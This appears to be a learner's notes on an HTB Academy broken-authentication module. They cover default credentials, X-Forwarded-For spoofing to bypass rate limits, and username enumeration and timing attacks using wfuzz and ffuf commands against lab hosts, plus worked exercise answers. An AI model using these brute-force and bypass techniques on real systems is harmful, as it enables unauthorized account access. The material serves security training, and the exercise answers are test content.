# Broken Authentication

## What is Authentication

Authentication is defined as **the act of proving an assertion**. In this module's context, which revolves around application security, authentication could be defined as the process of determining if an entity (a user or an automated application) is who it claims to be.

The most widespread authentication method used in web applications is **login forms**, where a user enters their username and password to prove their identity. Login forms can be found on websites such as HTB Academy and Hack the Box to email providers such as Gmail, online banking, members rewards sites, and the vast majority of websites that offer some service.

Authentication is probably the most widespread security measure, and it is the first line of defense against unauthorized access. While it is commonly referred to and shortened as "**auth**", but this short version is misleading because it could be confused with another essential security concept, **Authorization**.

[Authorization](https://en.wikipedia.org/wiki/Authorization) is defined as **the process of approving or disapproving a request from a given (authenticated) entity**. This module will not cover authorization in-depth. Understanding the difference between the two security concepts is vital to approach this module with the right mindset.

Assume that we have encountered a login form while performing a penetration test for our Inlanefreight customer. Nowadays, most companies offer certain services for which their customers have to register and authenticate.

Our goal as third-party assessors is to verify if these login forms are implemented securely and if we can bypass them to gain unauthorized access. There are many different methods and procedures to test login forms. We will discuss the most effective of them in detail throughout this module.

## Overview of Authentication Methods

During the authentication phase, the entity who wants to authenticate sends an **identification string** that could be an ID, a username, email, along with additional data. The most common type of data that an authentication process requires to be sent together with the identification string is a password string. That being said, the type of additional data can vary between implementations.

### Multi-Factor Authentication

**Multi-Factor Authentication**, commonly known as **MFA** (or **2FA** when there are just two factors involved), can result in a much more robust authentication process.

Factors are separated into three different domains:
* something the user **knows**, for example, a username or password
* something the user **has**, like a hardware token
* something the user **is**, usually a biometric fingerprint

When an authentication process requires the entity to send data that belongs to more than one of these domains, it should be considered an MFA process. Single Factor Authentication usually requires something the user **knows**:
* **Username** + **Password**

It is also possible for the requirement to be only something the user **has**.

Think about a corporate badge or a train ticket. Passing through a turnstile often requires you to swipe a badge that grants you access. In this case, you need no PIN, no identification string, or anything else but a card. This is an edge case because company badges, or train multi-cards, are often used to match a specific user by sending an ID. By swiping, both authorization and a form of authentication are performed.

### Form-Based Authentication

The most common authentication method for web applications is **Form-Based Authentication** (FBA). The application presents an HTML form where the user inputs their username and password, and then access is granted after comparing the received data against a backend. After a successful login attempt, the application server creates a session tied to a unique key (usually stored in a cookie). This unique key is passed between the client and the web application on every subsequent communication for the session to be maintained.

Some web apps require the user to pass through multiple steps of authentication. For example, the first step requires entering the username, the second the password, and the third a **One-time Password** (**OTP**) token. An **OTP** token can originate from a hardware device or mobile application that generates passwords. One-time Passwords usually last for a limited amount of time, for example, 30 seconds, and are valid for a single login attempt, hence the name one-time.

It should be noted that multi-step login procedures could suffer from [business logic](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability) vulnerabilities. For example, Step-3 might take for granted that Step-1 and Step-2 have been completed successfully.

### HTTP Based Authentication

Many applications offer **HTTP-based** login functionality. In these cases, the application server can specify different authentication schemes such as Basic, Digest, and NTLM. All HTTP authentication schemes revolve around the 401 status code and the **WWW-Authenticate** response header and are used by application servers to challenge a client request and provide authentication details (Challenge-Response process).

When using HTTP-based authentication, the **Authorization header** holds the authentication data and should be present in every request for the user to be authenticated.

From a network point of view, the abovementioned authentication methods could be less secure than FBA because every request contains authentication data. For example, to perform an HTTP basic auth login, the browser encodes the username and password using base64. The **Authorization header** will contain the base64-encoded credentials in every request. Therefore, an attacker that can capture the network traffic in plaintext will also capture credentials. The same would happen if FBA were in place, just not for every request.

Below is an example of the header that a browser sends to fulfill basic authentication:

**HTTP Authentication Header**

```
GET /basic_auth.php HTTP/1.1
Host: brokenauth.hackthebox.eu
Cache-Control: max-age=0
Authorization: Basic YWRtaW46czNjdXIzcDQ1NQ==
```
The authorization header specifies the HTTP authentication method, Basic in this example, and the token: if we decode the string:
```
YWRtaW46czNjdXIzcDQ1NQ==
```
as a base64 string, we'll see that the browser authenticated with the credentials: `admin:s3cur3p455`.

Digest and NTLM authentication are more robust because the data transmitted is hashed and could contain a nonce, but it is still possible to crack or reuse a captured token.

### Other Forms of Authentication
While uncommon, it is also possible that authentication is performed by checking the source IP address. A request from localhost or the IP address of a well-known/trusted server could be considered legitimate and allowed because developers assumed that nobody but the intended entity would use this IP address.

Modern applications could use third parties to authenticate users, such as [SAML](https://en.wikipedia.org/wiki/Security_Assertion_Markup_Language). Also, **APIs** usually require a specific authentication form, often based on a multi-step approach.

Attacks against API authentication and authorization, Single Sign-On, and OAuth share the same foundations as attacks against classic web applications. Nevertheless, these topics are pretty broad and deserve their own module.

### Login Example

A typical scenario for home banking authentication starts when an e-banking web application requests our ID, which could be a seven-digit number generated by the e-banking web application itself or a username chosen by the user. Then, on a second page, the application requests a password for the given ID. On a third page, the user must provide an OTP generated by a hardware token or received by SMS on their mobile phone. After providing the authentication details from the above two factors (2FA case), the e-banking web application checks if the ID, password, and OTP are valid.

## Overview of Attacks Against Authentication

Authentication attacks can take place against a total of three domains. These three domains are divided into the following categories:

The **HAS** domain
The **IS** domain
The **KNOWS** domain

### Attacking the HAS Domain

Speaking about the three domains described while covering Multi-Factor Authentication, the **has** domain looks quite plain because we either own a hardware token or do not. Things are more complicated than they appear, though:
* A badge could be **cloned** without taking it over
* A cryptographic algorithm used to generate One-Time Passwords could be **broken**
* Any physical device could be **stolen**

A long-range antenna can easily achieve a working distance of 50cm and clone a classic NFC badge. You may think that the attacker would have to be extremely close to the victim to execute such an attack successfully. Consider how close we are all sitting to each other when using public transport or waiting at a store queue, and you will probably change your mind. Multiple people are within reach to perform such a cloning attack every day.

Imagine that you are having a quick lunch at a bar near the office. You do not even notice an attacker that walks past your seat because you are preoccupied with an urgent work task. They just cloned the badge you keep in your pocket!!! Minutes later, they transfer your badge information into a clean token and use it to enter your company’s building while still eating lunch.

It is clear that cloning a corporate badge is not that difficult, and the consequences could be severe.

### Attacking the IS Domain

You may think that the **is** domain is the most difficult to attack. If a person relies on “something” to prove their identity and this “something” is compromised, they lose the unique way of proving their identity since there is no way one can change the way they are. Retina scan, fingerprint readers, facial recognition have been all proved to be breakable. All of them can be broken through a third-party leak, a high-definition picture, a skimmer, or even an evil maid that steals the right glass.

Companies that sell security measures based on the **is** domain state that they are incredibly secure. In August 2019, a company that builds biometric smart locks managed via a mobile or web application was [breached](https://www.vpnmentor.com/blog/report-biostar2-leak/). The company used fingerprints or facial recognition to identify authorized users. The breach exposed all fingerprints and facial patterns, including usernames and passwords, grants, and registered users' addresses. While users can easily change their password and mitigate the issue, anybody who can reproduce fingerprints or facial patterns will still be able to unlock and manage these smart locks.

### Attacking the KNOWS Domain

The **knows** domain is the one we will dig into in this module. It is the simplest one to understand, but we should thoroughly dive into every aspect because it is also the most widespread. This domain refers to things a user knows, like a **username** or a **password**. In this module, we will work against **FBA** only. Keep in mind that the same approach could be adapted to HTTP authentication implementations.

# Login Bruteforcing

## Default Credentials

It is common to find devices with **default credentials** due to human error or a breakdown in/lack of proper process. According to Rapid7’s [Under the hoodie](https://www.rapid7.com/research/reports/under-the-hoodie-2020/) report for 2020, Rapid7’s gained access using known default credentials or guessable accounts during 21% of their engagements

Unfortunately, default credentials are also used by maintainers working on Industrial Control Systems (ICS) environments. They prefer having well-known access credentials when doing maintenance than relying on a company user, who is often not cyber security-savvy, to store a complex set of credentials securely. All penetration testers have witnessed such credentials stored on a Post-it note. This does not justify default credentials being used, though. A mandatory step of security hardening is changing default credentials and using strong passwords at an early stage of application deployment.

Another well-known fact is that some vendors introduce hardcoded hidden accounts in their products. One example is [CVE-2020-29583](https://nvd.nist.gov/vuln/detail/CVE-2020-29583) on Zyxel USG. Researchers found a hardcoded account with admin privileges and an unchangeable password. As you can see on the [NIST](https://nvd.nist.gov/vuln/search/results?cwe_id=CWE-798) website, Zyxel is not alone. A quick search against the CVE list with "CWE-798 - use of hardcoded credentials" as filter returns more than 500 results.

There is an old project, still maintained by CIRT.net and available as a [web database](https://www.cirt.net/passwords) used to collect default credentials split by vendors. Also, [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv) has a good list based on CIRT.net. The two options above have some overlap but also differences. It is a good idea to check both lists. Back to SCADA, in 2016 [SCADA StrangeLove](http://scada.sl/) published a list of known passwords for industrial systems, both default and hardcoded, on their own [GitHub](https://github.com/scadastrangelove/SCADAPASS/blob/master/scadapass.csv) repository.

Even by today’s security standards, it is common to come across well-known/poor sets of credentials in both critical and non-critical devices or applications. Example sets could be:
* `admin:admin`
* `admin:password`

It's always a good idea to try known or poor `user`/`password` sets with the help of the abovementioned lists. As an example, after having found a Cisco device during a penetration test, we can see that [passdb](https://www.cirt.net/passwords?criteria=cisco) contains 65 entries for Cisco devices.

Depending on which device we have found, for example, a switch, a router, or an access point, we should try at least:
* `empty:Cisco`
* `cisco:cisco`
* `Cisco:Cisco`
* `cisco:router`
* `tech:router`

It should be noted that we may not find default or known credentials for every device or application inside the lists mentioned above and databases. In this case, a Google search could lead to very interesting findings. It is also common to come across easily guessable or weak user accounts in custom applications. This is why we should always try combinations such as: (`user:user`, `tech:tech`).

When we try to find default or weak credentials, we prefer using automated tools like `ffuf`, `wfuzz`, or custom Python scripts, but we could also do the same by hand or using a proxy such as Burp/ZAP. We encourage you to test all methods to become familiar with both automated tools and scripting.

### Hands-On Example

To start warming up, download this [Python script](https://academy.hackthebox.com/storage/modules/80/scripts/basic_bruteforce_py.txt), read the source code, and try to understand the comments. If you want to try this script against a live environment, download this basic [PHP code](https://academy.hackthebox.com/storage/modules/80/scripts/basic_bruteforce_php.txt) and place it on a web server that supports PHP. It will be helpful while trying to solve the next question.

Before we can start attacking any web page, we must first determine the URL parameters accepted by the page. To do so, we can use **Burp Suite** and capture the request to see what parameters were used. Another way to do so is through our browser's built-in developer tools. For example, we can open Firefox within the Pwnbox and then bring up the Network Tools with `[CTRL + SHIFT + E]`.

Once we do this, we can try to log in with any credentials (`test:test`) to run the form, after which the Network Tools would show the sent HTTP requests. Once we have the request, we can right-click on one of them and select `Copy > Copy POST data`.

This would give us the following POST parameters:
```bash
username=test&password=test
```
Another option would be to use `Copy > Copy as cURL command`, which would copy the entire `cURL` command, which we can use in the Terminal to repeat the same HTTP request:
```
user@htb[/htb]$ curl 'http://URL:PORT/login.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://URL:PORT' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://URL:PORT/login.php' -H 'Cookie: PHPSESSID=8iafr4t6c3s2nhkaj63df43v05' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'username=test&password=test'
```
As we can see, this command also contains the parameters `--data-raw 'username=test&password=test'`.

### Exercise

Question: Inspect the login page and perform a bruteforce attack. What is the valid username?

Solution: here, if we try to login, in the HTTP response, or in the Title of the browser tab or inside the page source, it is reported the name of the product, that is `WebAccess HMI/SCADA Software`. At this point, let's try to search for some default credentials related to this product. I tried to use Scada StrangeLove [Github] (https://github.com/scadastrangelove/SCADAPASS/blob/master/scadapass.csv) repository but we find only `admin:(blank)` that does not work. So, we need to google and search for references as this [link](https://www.192-168-1-1-ip.co/router/advantech/advantech-webaccess-browser-based-hmi-and-scada-software/11215/) and we can get our answer.

## Weak Bruteforce Protections

Before digging into attacks, we must understand the possible protections we could meet during our testing process. Nowadays, there are many different security mechanisms designed to prevent automated attacks. Among the most common are the following.
* **CAPTCHA**
* **Rate Limits**

Also, web developers often create their own security mechanisms that make the testing process more “interesting” for us, as these custom security mechanisms may contain bugs that we can exploit. Let’s first familiarize ourselves with common security mechanisms against automated attacks to understand their function and prepare our attacks against them.

### CAPTCHA

[CAPTCHA](https://en.wikipedia.org/wiki/CAPTCHA), a widely used security measure named after the Completely Automated Public Turing test to tell Computers and Humans Apart" sentence, can have many different forms. It could require, for example, typing a word presented on an image, hearing a short audio sample and entering what you heard into a form, matching an image to a given pattern, or performing basic math operations.

Even though CAPTCHA has been successfully bypassed in the past, it is still quite effective against automated attacks. An application should at least require a user to solve a CAPTCHA after a few failed attempts. Some developers often skip this protection altogether, and others prefer to present a CAPTCHA after some failed logins to retain a good user experience.

It is also possible for developers to use a custom or weak implementation of CAPTCHA, where for example, the name of the image is made up of the chars contained within the image. Having weak protections is often worse than having no protection since it provides a false sense of security. The image below shows a weak implementation where the PHP code places the image's content into the `id` field. This type of weak implementation is rare but not unlikely:
```
https://brokenauthentication.hackthebox.eu/register_captcha.php
```
![06-captcha_id](https://academy.hackthebox.com/storage/modules/80/06-captcha_id.png)

As an attacker, we can just read the page's source code to find the CAPTCHA code's value and bypass the protection. **We should always read the source**.

As developers, we should not develop our own CAPTCHA but rely on a well-tested one and require it after very few failed logins.

### Rate Limiting

Another standard protection is rate-limiting. Having a counter that increments after each failed attempt, an application can block a user after three failed attempts within 60 seconds and notifies the user accordingly.

A standard brute force attack will not be efficient when rate-limiting is in place. When the tool used is not aware of this protection, it will try username and password combinations that are never actually validated by the attacked web application. In such a case, the majority of attempted credentials will appear as invalid (false negatives). A simple workaround is **to teach our tool to understand messages related to rate-limiting and successful and failed login attempts**. Download [rate_limit_check.py](https://academy.hackthebox.com/storage/modules/80/scripts/rate_limit_check_py.txt) and go through the code. The relevant lines are 10 and 13, where we configure a wait time and a lock message, and line 41, where we do the actual check.

After being blocked, the application could also require some manual operation before unlocking the account. For example, a confirmation code sent by email or a tap on a mobile phone. Rate-limiting does not always impose a cooling-off period. The application may present the user with questions that they must answer correctly before reaccessing the login functionality by the time rate-limiting kicks in.

Most standard rate-limiting implementations that we see nowadays impose a delay after `N` failed attempts. For example, a user can try to log in three times, and then they must wait 1 minute before trying again. After three additional failed attempts, they must wait 2 minutes and so on.

On the one hand, a regular user could be upset after a delay is imposed, but on the other hand, rate limiting is an excellent form of protection against automated brute force attacks. Note that **rate-limiting can be made more robust by gradually increasing the delay and clustering requests by username, source IP address, browser User-Agent, and other characteristics**.

We think that every web application has its own requirements for both usability and security that should be thoroughly balanced when developing a rate limit. Applying an early lockout on a crowded and non-critical web application will undoubtedly lead to many requests to the helpdesk. On the other hand, using a rate limit too late could be completely useless.

Mature frameworks have brute-force protections built-in or utilize external plugins/extensions for the same purpose. As a last resort, major webservers like Apache httpd or Nginx could be used to perform rate-liming on a given login page.

### Insufficient Protections

When an attacker can tamper with data taken into consideration to increase security, they can bypass all or some protections. For example, changing the `User-Agent` header is easy. Some web applications or web application firewalls leverage headers like `X-Forwarded-For` to guess the actual source IP address. This is done because many internet providers, mobile carriers, or big corporations usually "hide" users behind NAT. Blocking an IP address without the help of a header like `X-Forwarded-For` may result in blocking all users behind the specific NAT.

A simple vulnerable example could be:
```php
<?php
// get IP address
if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {
	$realip = array_map('trim', explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']))[0];
} else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
	$realip = array_map('trim', explode(',', $_SERVER['HTTP_CLIENT_IP']))[0];
} else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
	$realip = array_map('trim', explode(',', $_SERVER['REMOTE_ADDR']))[0];
}

echo "<div>Your real IP address is: " . htmlspecialchars($realip) . "</div>";
?>
```
[CVE-2020-35590](https://nvd.nist.gov/vuln/detail/CVE-2020-35590) is related to a WordPress plugin vulnerability similar to the one showcased in the snippet above. The plugin’s developers introduced a security improvement that would block a login attempt from the same IP address. Unfortunately, this security measure could be bypassed by crafting an `X-Forwarded-For` header.

Starting from the script we provided in the previous chapter, we can alter the headers in the provided [basic_bruteforce.py](https://academy.hackthebox.com/storage/modules/80/scripts/basic_bruteforce_py.txt) script's `dict` definition at line 9 like this:
```python
headers = {
  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
  "X-Forwarded-For": "1.2.3.4"
}
```
The vulnerable PHP code will think the request originates from the 1.2.3.4 IP address. Note that we used a multi-line declaration of headers' `dict` to maintain good readability.

Some web applications may grant users access based on their source IP address. The behavior we just discussed could be abused to bypass this type of protection.

From a developer's perspective, all security measures should be considered with both user experience and business security in mind. A bank can impose a user lockout that requires a phone call to be undone. A bank can also avoid CAPTCHA because of the need for a second authentication factor (OTP on a USB dongle or via SMS, for example). However, an e-magazine should carefully consider every security protection to achieve a good user experience while retaining a strong security posture.

In no case should a web application rely on a single, tamperable element as a security protection. There is no reliable way to identify the actual IP address of a user behind a NAT, and every bit of information used to tell visitors apart can be tampered with. Therefore, developers should implement protections against brute force attacks that slow down an attacker as much as possible before resorting to user lockout. Slowing things down can be achieved through more challenging CAPTCHA mechanisms, such as CAPTCHA that changes its format at every page load, or CAPTCHA chained with a personal question that we user has answered before. That said, the best solution would probably be to use MFA.

### Exercise

Question: Work on webapp at URL /question2/ and try to bypass the login form using one of the method showed. What is the flag?

Solution: in this case, by using Burp, we can insert `X-Forwarded-For: 127.0.0.1` inside the HTTP request with any value of username and password and we will bypass the authentication.

## Bruteforcing Usernames

**Username enumeration** is frequently overlooked, probably because it is assumed that a username is not private information. When you write a message to another user, we commonly presume we know their username, email address, etc. The same username is oftentimes reused to access other services such as **FTP**, **RDP** and **SSH**, among others. Since many web applications allow us to identify usernames, we should take advantage of this functionality and use them for later attacks.

For example, on Hack The Box, `userid` and `username` are different. Therefore, user enumeration is not possible, but a wide range of web applications suffer from this vulnerability.

Usernames are often far less complicated than passwords. They rarely contain special characters when they are not email addresses. Having a list of common users gives an attacker some advantages. In addition to achieving good User Experience (UX), coming across random or non-easily-predictable usernames is uncommon. A user will more easily remember their email address or nickname than a computer-generated and (pseudo)random username.

Having a list of valid usernames, an attacker can narrow the scope of a brute force attack or carry out targeted attacks (leveraging OSINT) against support employees or users themselves. Also, a common password could be easily sprayed against valid accounts, often leading to a successful account compromise.

It should be noted that usernames can also be harvested by crawling a web application or using public information, for example, company profiles on social networks.

Protection against username enumeration attacks can have an impact on user experience. A web application revealing that a username exists or not may help a legitimate user identify that they failed to type their username correctly, but the same applies to an attacker trying to determine valid usernames. Even well-known and mature web frameworks, like WordPress, suffer from user enumeration because the development team chose to have a smoother UX by lowering the framework’s security level a bit. You can refer to this [ticket](https://core.trac.wordpress.org/ticket/3708) for the entire story.

We can see the response message after submitting a non-existent username stating that the entered username is unknown.
```
https://wordpress.hackthebox.eu/wp-login.php
```
![01-wordpress_wrong_username](https://academy.hackthebox.com/storage/modules/80/06-bruteforce_username/01-wordpress_wrong_username.png)

In the second example, we can see the response message after submitting a valid username (and a wrong password) stating that the entered username exists, but the password is incorrect.
```
https://wordpress.hackthebox.eu/wp-login.php
```
![02-wordpress_wrong_password](https://academy.hackthebox.com/storage/modules/80/06-bruteforce_username/02-wordpress_wrong_password.png)

The difference is clear. On the first try, when a non-existent username is submitted, the application shows an empty login input together with an "Unknown username" message. On the second try, when an existing username is submitted (along with an invalid password), the username form field is prefilled with the valid username. The application shows a message clearly stating that the password is wrong (for this valid username).

### User Unknown Attack

When a failed login occurs, and the application replies with "Unknown username" or a similar message, an attacker can perform a brute force attack against the login functionality in search of a, "**The password you entered for the username X is incorrect**" or a similar message. During a penetration test, do not forget to also check for generic usernames such as helpdesk, tech, admin, demo, guest, etc.

[SecLists](https://github.com/danielmiessler/SecLists/tree/master/Usernames) provides an extensive collection of wordlists that can be used as a starting point to mount user enumeration attacks.

Let us try to brute force a web application. We have two ways to see how the web application expects data. One is by inspecting the HTML form, and the other using an intercepting proxy to capture the actual POST request. When we deal with a basic form, there are no significant differences. However, some applications use obfuscated or contrived JavaScript to hide or obscure details. In these cases, the use of an intercepting proxy is usually preferred. By opening the login page and attempting to log in, we can see that the application accepts the `userid` in the `Username` field and the `password` as `Password`:
![unknown_username-burp_request](https://academy.hackthebox.com/storage/modules/80/unknown_username-burp_request.png)

We notice that the application replies with an `Unknown username` message, and we guess that it uses a different message when the username is valid.

We can carry out the brute force attack using `wfuzz` and a reverse string match against the response text (`--hs` "Unknown username," where "`hs`" should be a mnemonic used for string hiding), using a short wordlist from SecLists. Since we are not trying to find a valid password, we do not care about the `Password` field, so we will use a dummy one:
**WFuzz - Unknown Username**
```
user@htb[/htb]$ wfuzz -c -z file,/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt -d "Username=FUZZ&Password=dummypass" --hs "Unknown username" http://brokenauthentication.hackthebox.eu/user_unknown.php

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://brokenauthentication.hackthebox.eu/user_unknown.php
Total requests: 17

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000002:   200        56 L     143 W    1984 Ch     "admin"

Total time: 0.017432
Processed Requests: 17
Filtered Requests: 16
Requests/sec.: 975.1927
```
While `wfuzz` automatically hides any response containing an "Unknown username" message, we notice that "admin" is a valid user (the remaining usernames on the top-username-shortlist.txt wordlist are not valid). If an excellent UX is not a hard requirement, an application should reply with a generic message like "Invalid credentials" for unknown usernames and wrong passwords.

### Username Existence Inference

Sometimes a web application may not explicitly state that it does not know a specific username but allows an attacker to infer this piece of information. Some web applications prefill the username input value if the username is valid and known but leave the input value empty or with a default value when the username is unknown. This is quite common on mobile versions of websites and was also the case on the vulnerable WordPress login page we saw earlier. While developing, always try to give the same experience for both failed and granted login: even a slight difference is more than enough to infer a piece of information.

Testing a web application by logging in as an unknown user, we notice a generic error message and an empty login page:
```
https://brokenauthentication.hackthebox.eu/inference.php
```
![04-inference_unknown](https://academy.hackthebox.com/storage/modules/80/06-bruteforce_username/04-inference_unknown.png)

When we try to log in as user "admin", we notice that the input field is pre-filled with the (probably) a valid username, even if we receive the same generic error message:
```
https://brokenauthentication.hackthebox.eu/inference.php
```
![05-inference_valid](https://academy.hackthebox.com/storage/modules/80/06-bruteforce_username/05-inference_valid.png)

While uncommon, it is also possible that different cookies are set when a username is valid or not. For example, to check for password attempts using client-side controls, a web application could set and then check a cookie named "failed_login" only when the username is valid. Carefully inspect responses watching for differences in both HTTP headers and the HTML source code.

### Timing Attack
Some authentication functions may contain flaws by design. One example is an authentication function where the username and password are checked sequentially. Let us analyze the below routine:

**Vulnerable Authentication Code**
```php
<?php
// connect to database
$db = mysqli_connect("localhost", "dbuser", "dbpass", "dbname");

// retrieve row data for user
$result = $db->query('SELECT * FROM users WHERE username="'.safesql($_POST['user']).'" AND active=1');

// $db->query() replies True if there are at least a row (so a user), and False if there are no rows (so no users)
if ($result) {
  // retrieve a row. don't use this code if multiple rows are expected
  $row = mysqli_fetch_row($result);

  // hash password using custom algorithm
  $cpass = hash_password($_POST['password']);
  
  // check if received password matches with one stored in the database
  if ($cpass === $row['cpassword']) {
	echo "Welcome $row['username']";
  } else {
    echo "Invalid credentials.";
  } 
} else {
  echo "Invalid credentials.";
}
?>
```
The code snippet first connects to the database and then executes a query to retrieve an entire row where the username matches the requested one. If there are no results, the function ends with a generic message. When `$result` is true (the user exists and is active), the provided password is hashed and compared. If the hashing algorithm used is strong enough, timing differences between the two branches will be noticeable. By calculating `$cpass` using a generic `hash_password()` function, the response time will be higher than the other case. This small error could be avoided by checking user and password in the same step, having a similar time for both valid and invalid usernames.

Download the script [timing.py](https://academy.hackthebox.com/storage/modules/80/scripts/timing_py.txt) to witness these types of timing differences and run it against an example web application ([timing.php](https://academy.hackthebox.com/storage/modules/80/scripts/timing_php.txt)) that uses `bcrypt`.

**Timing Attack - Timing.py**

```
user@htb[/htb]$ python3 timing.py /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt

[+] user root took 0.003
[+] user admin took 0.263
[+] user test took 0.005
[+] user guest took 0.003
[+] user info took 0.001
[+] user adm took 0.001
[+] user mysql took 0.001
[+] user user took 0.001
[+] user administrator took 0.001
[+] user oracle took 0.001
[+] user ftp took 0.001
[+] user pi took 0.001
[+] user puppet took 0.001
[+] user ansible took 0.001
[+] user ec2-user took 0.001
[+] user vagrant took 0.001
[+] user azureuser took 0.001
```

Given that there could be a network glitch, it is easy to identify "admin" as a valid user because it took way more time than other tested users. If the algorithm used was a fast one, time differences would be smaller, and an attacker could have a false positive because of a network delay or CPU load. However, the attack is still possible by repeating a large number of requests to create a model. While we could assume that a modern application hashes passwords using a robust algorithm to make a potential offline brute force attack as slow as possible, it is possible to infer information even if it uses a fast algorithm like **MD5** or **SHA1**.

When [LinkedIn's](https://en.wikipedia.org/wiki/2012_LinkedIn_hack) userbase was leaked in 2012, InfoSec professionals started a debate about **SHA1** being used as a hashing algorithm for users' passwords. While **SHA1** did not break during those days, it was known as an insecure hashing solution. Infosec professionals started arguing about the choice to use **SHA1** instead of more robust hashing algorithms like [scrypt](https://www.tarsnap.com/scrypt.html), [bcrypt](https://en.wikipedia.org/wiki/Bcrypt) or [PBKDF](https://en.wikipedia.org/wiki/Pbkdf2) (or [argon2](https://en.wikipedia.org/wiki/Argon2)).

While it is always preferable to use a more robust algorithm than a weaker one, an architecture engineer should also keep in mind the computational cost. This very basic Python script helps shed some light on the issue:

**Python - Encryption Algorithms**

```python
import scrypt
import bcrypt
import datetime
import hashlib

rounds = 100
salt = bcrypt.gensalt()

t0 = datetime.datetime.now()

for x in range(rounds):
    scrypt.hash(str(x).encode(), salt)

t1 = datetime.datetime.now()

for x in range(rounds):
    hashlib.sha1(str(x).encode())

t2 = datetime.datetime.now()

for x in range(rounds):
    bcrypt.hashpw(str(x).encode(), salt)

t3 = datetime.datetime.now()

print("sha1:   {}\nscrypt: {}\nbcrypt: {}".format(t2-t1,t1-t0,t3-t2))
```
Keep in mind that modern best practices highly recommend using more robust algorithms, which results in an increment of CPU time and RAM usage. If we focus on **bcrypt** for a minute, running the script above on an 8core eighth-gen i5 gives the following results:
**Python - Hashtime.py**

```
user@htb[/htb]$ python3 hashtime.py

sha1:   0:00:00.000082
scrypt: 0:00:03.907575
bcrypt: 0:00:22.660548
```
Let us add some context by going over a rough example:

* LinkedIn has \~200M daily users, which means \~24 logins per second (we are not excluding users with a remember-me token).

If they used a robust algorithm like **bcrypt**, which used 0.23 seconds for each round on our test machine, they would need six servers just to let people log in. This does not sound like a big issue for a company that runs thousands of servers, but it would require an overhaul of the architecture.

### Enumerate through Password Reset
Reset forms are often less well protected than login ones. Therefore, they very often leak information about a valid or invalid username. Like we have already discussed, an application that replies with a "**You should receive a message shortly**" when a valid username has been found and "**Username unknown, check your data**" for an invalid entry leaks the presence of registered users.

This attack is noisy because some valid users will probably receive an email that asks for a password reset. That being said, these emails frequently do not get proper attention from end-users.

### Enumerate through Registration Form

By default, a registration form that prompts users to choose their username usually replies with a clear message when the selected username already exists or provides other “tells” if this is the case. By abusing this behavior, an attacker could register common usernames, like admin, administrator, tech, to enumerate valid ones. A secure registration form should implement some protection before checking if the selected username exists, like a CAPTCHA.

One interesting feature of email addresses that many people do not know or do not have ready in mind while testing is sub-addressing. This extension, defined at [RFC5233](https://tools.ietf.org/html/rfc5233), says that any `+tag` in the left part of an email address should be ignored by the Mail Transport Agent (MTA) and used as a tag for sieve filters. This means that writing to an email address like `student+htb@hackthebox.eu` will deliver the email to `student@hackthebox.eu` and, if filters are supported and properly configured, will be placed in folder `htb`. Very few web applications respect this RFC, which leads to the possibility of registering almost infinite users by using a tag and only one actual email address.

Of course, this attack is quite loud and should be carried out with great care.

### Predictable Usernames

In web applications with fewer UX requirements like, for example, home banking or when there is the need to create many users in a batch, we may see usernames created sequentially.

While uncommon, you may run into accounts like `user1000`, `user1001`. It is also possible that "administrative" users have a predictable naming convention, like `support.it`, `support.fr`, or similar. An attacker could infer the algorithm used to create users (incremental four digits, country code, etc.) and guess existing user accounts starting from some known ones.

### Exercise
Question: Find the valid username for the web application based at subdirectory /question2/.

Solution: here we must infer what is the username. In general could be several solutions, as the one explained in the `Username Existence Inference` section. In this exercise we cannot infer the right username in that way, but we can do it by analyzing the page source of each HTTP response. We note that our HTTP request has four parameters: `Username`, `wronguser`, `count` and `Password`. `wronguser` stores the previous wrong username we typed in our previous HTTP request but it is not important for our purpose. By submitting the usernames of our wordlist, we can note that the page source with the wrong usernames has this part of code:
```html
<SNIP>
<input type="hidden" name="wronguser" value="admin"><input type="hidden" name="count" value="1">
<SNIP>
```
while, the page source with the right username has this part of code:
```html
<SNIP>
<input type="hidden" name="validuser" value="ansible"><input type="hidden" name="count" value="1">
<SNIP>
```
In general, for automating this search, we should filter for `wronguser` or similar strings. We can use `ffuf` or `wfuzz` tools:

**ffuf**
```
ffuf -w /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt:FUZZ -u 'http://64.227.34.91:30068/question2/' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://64.227.34.91:30068' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://64.227.34.91:30068/question2/' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -d 'Username=FUZZ&wronguser=&count=1&Password=testt' -fr "wronguser"
```

**wfuzz**
```
